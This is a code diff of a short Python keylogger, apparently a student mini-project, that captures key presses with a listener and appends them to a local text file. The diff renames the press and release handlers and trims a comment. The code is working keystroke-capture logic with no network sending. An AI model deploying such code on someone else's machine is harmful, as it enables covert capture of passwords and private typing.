@@ -10,7 +10,7 @@ keys = []
 
 
 # on_press key event
-def on_press(key):
+def press(key):
     global keys, count
     #the keys are recorded and joined  here
     keys.append(key)
@@ -23,7 +23,7 @@ def on_press(key):
         keys=[]
         
         
-# write the keys in the file miniproject is done by rithika baskaran miniproject is done bt rithika baskaran is
+# write the keys in the file 
    
 def write_file(keys):
      with open("test2.txt","a") as f:
@@ -39,13 +39,13 @@ def write_file(keys):
              
 # on_release event             
 
-def on_release(key):
+def release(key):
     if key == Key.esc:
         return False
     
     
 # listener listens to the key events
-with Listener(on_press=on_press,on_release=on_release) as listener:
+with Listener(on_press= press,on_release= release) as listener:
     listener.join()
 
 
